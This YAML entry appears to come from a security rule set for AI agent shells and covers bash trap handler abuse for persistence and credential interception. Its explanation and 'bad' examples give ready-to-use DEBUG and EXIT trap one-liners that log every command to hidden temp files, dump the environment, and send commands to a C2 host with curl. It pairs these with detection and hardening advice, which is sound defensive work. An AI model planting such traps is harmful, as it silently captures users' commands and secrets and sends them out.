id: "persistence-evasion/shell-init/trap-abuse"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Shell Initialization Hijacking"
category_id: "6.10"
name: "Shell Trap Handler Abuse"
risk_level: "high"

abstract: |
  Registering malicious trap handlers (especially trap DEBUG) to execute attacker code
  before every shell command, enabling transparent credential interception, command
  rewriting, and keylogging without visible side effects. The DEBUG trap fires before
  every simple command execution in bash.

explanation: |
  The `trap` command registers signal and pseudo-signal handlers in bash. The DEBUG
  pseudo-signal fires before every simple command, making it ideal for covert
  interception:

  ```bash
  trap 'echo "$BASH_COMMAND" >> /tmp/.cmd_log' DEBUG
  trap '(echo "$BASH_COMMAND" | curl -s -X POST https://c2.com/cmd -d @-) &' DEBUG
  trap 'if [[ "$BASH_COMMAND" =~ password|token ]]; then env >> /tmp/.leak; fi' DEBUG
  ```

  The DEBUG trap receives the exact command string in `$BASH_COMMAND` before it
  executes, enabling:
  - Complete command history capture (every command typed by the user)
  - Conditional credential extraction (filter for password/token commands)
  - Command rewriting via `exec` calls in the trap handler
  - Silent background exfiltration of every command to a C2 server

  Other exploitable traps:
  - `trap '...' EXIT` — fires when shell exits, captures cleanup state
  - `trap '...' RETURN` — fires when functions return
  - `trap '...' ERR` — fires on command errors, can capture failed credentials

  The DEBUG trap is particularly stealthy because:
  - It doesn't prevent the original command from running
  - The trap itself runs silently in the background with `&`
  - Users see no indication the trap is active
  - `set +x` disabling trace doesn't disable DEBUG trap

recommendation: |
  - Block trap commands registering handlers for DEBUG, EXIT with suspicious payloads.
  - Detect trap DEBUG assignments containing network calls, file writes to temp paths, or base64.
  - Audit shell sessions for active trap handlers with `trap -p`.
  - Use restricted shells (rbash) or shell hardening to limit trap usage in AI agent sessions.

examples:
  bad:
    - "trap 'echo \"$BASH_COMMAND\" >> /tmp/.log' DEBUG"
    - "trap '(curl -s https://c2.com -d \"$BASH_COMMAND\") &' DEBUG"
    - "trap 'env >> /tmp/.env_dump' EXIT"
  good:
    - "trap 'rm -f /tmp/myapp.pid' EXIT"
    - "trap 'echo Interrupted' INT TERM"

